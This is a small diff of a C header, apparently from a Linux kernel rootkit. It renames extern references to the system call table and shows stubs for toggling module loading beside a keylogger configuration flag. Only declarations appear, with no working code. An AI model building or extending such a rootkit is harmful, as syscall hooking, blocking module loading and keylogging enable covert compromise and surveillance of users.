@@ -41,7 +41,7 @@
 # define DEBUG_RW(fmt, ...)
 #endif
 
-extern unsigned long *sys_call_table;
+extern unsigned long *my_sys_call_table;
 
 char *strnstr(const char *haystack, const char *needle, size_t n);
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
@@ -60,7 +60,7 @@ void disable_module_loading(void);
 void enable_module_loading(void);
 
 #if defined(_CONFIG_X86_64_)
-extern unsigned long *ia32_sys_call_table;
+extern unsigned long *my_ia32_sys_call_table;
 #endif
 
 #if defined(_CONFIG_KEYLOGGER_)
